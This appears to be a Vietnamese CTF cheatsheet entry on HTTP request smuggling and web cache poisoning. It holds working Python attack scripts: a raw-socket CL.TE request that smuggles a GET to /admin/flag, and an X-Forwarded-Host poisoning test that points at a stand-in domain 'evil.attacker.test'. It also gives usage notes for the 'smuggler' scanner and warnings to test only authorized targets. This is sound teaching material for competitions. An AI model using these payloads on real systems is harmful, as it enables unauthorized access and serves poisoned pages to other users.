# HTTP Request Smuggling (giấu 1 request trong request khác)

Hầu hết web hiện đại có 2 lớp server nối tiếp: 1 proxy/WAF (lớp lọc tự động, chặn request khả nghi) hoặc CDN đứng trước, 1 server thật (backend) đứng sau. Mỗi request HTTP cần 1 cách để server biết "request này dài bao nhiêu, kết thúc ở đâu". Nếu 2 lớp server đó đọc "chỗ kết thúc" KHÁC NHAU (ví dụ 1 lớp tin vào header ghi số byte, lớp khác tin vào kiểu đọc "chia đoạn"), bạn có thể giấu 1 request thứ 2 vào bên trong request đầu — lớp đầu tưởng đã gửi xong 1 request, nhưng lớp sau lại thấy thêm 1 request nữa, request đó có thể bị ghép nhầm vào của người dùng khác gửi ngay sau bạn.

Đây là 1 kỹ thuật RỦI RO CAO khi test trên hạ tầng chung — có thể ảnh hưởng tới người chơi khác hoặc cả hệ thống. Chỉ test khi được phép rõ ràng, nên ưu tiên tự dựng/test trên service của chính đội mình trước.

Trên Burp bạn nhận ra lỗi này khi: response có header `Via`, `X-Cache`, `X-Served-By`, hoặc `Server: nginx` (tên công nghệ) khác hẳn với công nghệ app thật (ví dụ thấy cookie Laravel nhưng Server lại là nginx) — đây là dấu hiệu có 2 lớp server. Cần dùng Burp Repeater và tắt tính năng tự sửa "Content-Length" để gửi được request cố ý "méo".

## Snippet copy-là-chạy

```python
import re
import socket

host = "target"
port = 80

def solve_one(host_, port_):
    # Kỹ thuật CL.TE: lớp proxy (ngoài) đọc theo Content-Length, lớp backend (trong) đọc theo
    # Transfer-Encoding: chunked -- 2 lớp hiểu "request dài bao nhiêu" khác nhau.
    #
    # Request ẩn (smuggled) muốn nhồi vào: GET /admin/flag -- lớp proxy coi đây là 1 phần
    # BODY của request chính (vì nó đọc đủ 5 byte rồi dừng), nhưng lớp backend coi đây là
    # request MỚI (vì nó đọc tới chunk "0" rồi dừng, phần còn lại là request kế tiếp).
    smuggled = "GET /admin/flag HTTP/1.1\r\nHost: localhost\r\n\r\n"
    chunk_body = f"0\r\n\r\n{smuggled}"
    # Content-Length ở đây PHẢI cố ý ghi sai -- chỉ đủ độ dài của "0\r\n\r\n" (5 byte),
    # không phải độ dài thật của toàn bộ chunk_body. Đây chính là chỗ "lỗi cố ý" tạo bất đồng.
    cl_value = len("0\r\n\r\n")

    req = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host_}\r\n"
        f"Content-Length: {cl_value}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"{chunk_body}"
    )

    try:
        sock = socket.create_connection((host_, port_), timeout=5)
        sock.sendall(req.encode())
        resp = sock.recv(8192).decode(errors="replace")
        sock.close()
    except OSError:
        return None

    m = re.search(r"FHACKER2026\{[0-9a-fA-F]{64}\}", resp)
    return m.group(0) if m else resp  # nếu chưa có flag, trả resp để tự đọc bằng mắt


if __name__ == "__main__":
    print(solve_one(host, port))
```

## Giải thích cho người mới

- Đây là bài DUY NHẤT trong bộ cheatsheet không dùng thư viện `requests` — vì `requests` tự "dọn dẹp" request cho đúng chuẩn (tự tính lại Content-Length, không cho gửi request méo), nên phải dùng `socket` (kết nối mạng thô) để tự gõ từng byte của request, giống cách bạn tự gõ tay trong Burp Repeater sau khi tắt "Update Content-Length".
- `\r\n` là ký tự xuống dòng chuẩn của HTTP (khác `\n` thường của Python) — mọi dòng header HTTP phải kết thúc bằng `\r\n`, 2 lần `\r\n\r\n` liên tiếp nghĩa là "hết phần header, bắt đầu phần body".
- `Content-Length: {cl_value}` cố ý ghi NHỎ HƠN độ dài thật của `chunk_body` — đây là "lỗi cố ý" khiến 2 lớp server đọc request khác nhau: lớp đọc theo Content-Length sẽ dừng sớm ở đúng `cl_value` byte, còn lớp đọc theo Transfer-Encoding: chunked sẽ đọc tiếp tới khi gặp đúng định dạng chunk kết thúc (`0\r\n\r\n`).
- `sock.recv(8192)` đọc tối đa 8192 byte response trả về — nếu kỹ thuật thành công, phần nội dung của request ẩn (`/admin/flag`) có thể lộ ra trong response của request KẾ TIẾP gửi trên cùng kết nối (không phải response của chính request này) — thực tế khi thi cần gửi 1 request "mồi" ngay sau để lấy phần bị lẫn ra, snippet này chỉ minh họa cấu trúc cơ bản.

## Dùng tool có sẵn `smuggler` thay vì tự viết tay

Script `socket` thô ở trên chỉ thử đúng 1 kiểu (CL.TE). Để dò an toàn xem có bất đồng bộ nào tồn tại không (bằng cách đo thời gian phản hồi, không gửi payload "nguy hiểm" thật), dùng `smuggler` đã có sẵn tại `~/hoc/CTF/Tools/web/smuggler/`:

```bash
spwn
cd ~/hoc/CTF/Tools/web/smuggler
python3 smuggler.py -u "http://target/"
```

- Không cần tham số gì đặc biệt khác ngoài `-u` — `smuggler` tự gửi hàng chục biến thể request (CL.TE, TE.CL, TE.TE với các cách viết `Transfer-Encoding` khác nhau) và tự đo xem request nào khiến kết nối "lạc nhịp" (thời gian phản hồi bất thường).
- Kết quả in ra dạng `[VULNERABLE]` kèm tên kỹ thuật (ví dụ `CLTE`) nếu phát hiện; nếu toàn bộ đều `[-]` hoặc `safe`, nghĩa là không có 2 lớp server hoặc đã được patch — không cần cố viết script tay nữa.
- Nếu `-m POST` không cho kết quả, thử lại với `-m GET` (`--method GET`) — endpoint một số app chỉ nhận GET.
- Thấy dòng ghi `[VULNERABLE]` rồi mới áp dụng đúng kỹ thuật tương ứng (ví dụ CL.TE) vào script `socket` ở trên để tự tạo request giấu theo đúng mục tiêu bạn muốn (đọc `/admin/flag`...).

## Cache Poisoning (cùng nguyên nhân gốc, hậu quả khác)

Request Smuggling (ở trên) làm request ẩn ảnh hưởng tới **người dùng kế tiếp trên cùng 1 kết nối**. **Cache Poisoning** là hậu quả khác, nguy hiểm rộng hơn: nếu có 1 lớp CDN/cache đứng trước (lưu lại response để trả nhanh cho những lượt sau, không phải hỏi lại server thật mỗi lần), và bạn khiến nó **lưu nhầm 1 response độc vào cache**, thì **MỌI người** ghé trang đó sau bạn — không chỉ 1 người kế tiếp — đều nhận response độc đã bị lưu sẵn.

Cách hay gặp nhất không cần tới kỹ thuật smuggling phức tạp ở trên: nhiều server tin vào 1 **header do chính bạn gửi lên** để tạo link tuyệt đối trong trang (ví dụ `X-Forwarded-Host` dùng để biết "domain thật" khi có proxy đứng trước), nhưng lớp cache lại **không tính header đó vào "chìa khoá" lưu cache** (gọi là unkeyed input — dữ liệu ảnh hưởng tới response nhưng cache không biết để phân biệt). Kết quả: bạn gửi 1 request với `X-Forwarded-Host` trỏ tới domain độc, server trả về trang có link trỏ sang domain độc đó, cache lưu lại response này dưới "chìa khoá" y hệt request bình thường — và phát lại response độc đó cho mọi người sau.

```python
import requests

base = "http://target"
s = requests.Session()
s.verify = False

def solve_one(session, base_url):
    # Bước 1: gửi request với header X-Forwarded-Host trỏ domain do bạn kiểm soát (dùng domain giả định)
    evil_host = "evil.attacker.test"
    r = session.get(
        f"{base_url}/",
        headers={"X-Forwarded-Host": evil_host},
        timeout=5,
    )
    # Nếu response có chứa domain giả ở link/script tag -- header này đang bị dùng để build URL
    poisoned = evil_host in r.text
    print("Header X-Forwarded-Host ảnh hưởng response:", poisoned)
    if not poisoned:
        return None

    # Bước 2: gửi lại request BÌNH THƯỜNG (không có header lạ) -- xem cache có trả nhầm bản độc không
    r2 = session.get(f"{base_url}/", timeout=5)
    cached = evil_host in r2.text
    print("Request thường (không header lạ) vẫn thấy domain độc -- CACHE ĐÃ BỊ ĐẦU ĐỘC:", cached)
    return cached
```

- `headers={"X-Forwarded-Host": evil_host}` giả vờ là proxy đang nói với server thật "domain gốc người dùng gõ là `evil.attacker.test`" — nếu code server dùng giá trị này để tự build link (ví dụ link "reset password" gửi trong email, hoặc link `<script src="http://{host}/app.js">`), link sinh ra sẽ trỏ sang domain độc.
- Request thứ 2 **không có header lạ nào** — mục đích là kiểm tra có phải response bị CACHE giữ lại (vẫn thấy `evil_host` dù request này hoàn toàn "sạch") hay không, khác với chỉ ảnh hưởng đúng request đang gửi (không có cache).
- Nếu `cached=True`: xác nhận đầu độc cache thành công — mọi người dùng khác ghé trang chủ **sau thời điểm bạn gửi request bước 1** sẽ thấy link trỏ sang domain độc, tới khi cache tự hết hạn hoặc bị xoá.

## Lưu ý nhanh

- Nếu không chắc chắn có 2 lớp server, dùng kỹ thuật dò an toàn bằng đo thời gian (timing-based) trước khi gửi payload "nguy hiểm" — tool `smuggler` ở `~/hoc/CTF/Tools/web/smuggler/` tự quét hàng chục biến thể mà không ảnh hưởng ai.
- Nếu không thấy hiệu ứng, có thể app chỉ có 1 lớp server (không có proxy/CDN phía trước) — kỹ thuật này không áp dụng được.
- Nhiều backend/proxy hiện đại đã tự chặn request có cả 2 header `Content-Length` và `Transfer-Encoding` cùng lúc (đã patch) — nếu kết nối bị đóng ngay, khả năng cao là trường hợp này.
- Tuyệt đối không spam kỹ thuật này lên hạ tầng chung đang phục vụ nhiều đội — chỉ test đúng mục tiêu được phép.
- Chỉ dùng trên hệ thống được phép (máy chủ của đội mình/đối phương trong phạm vi thi đấu).
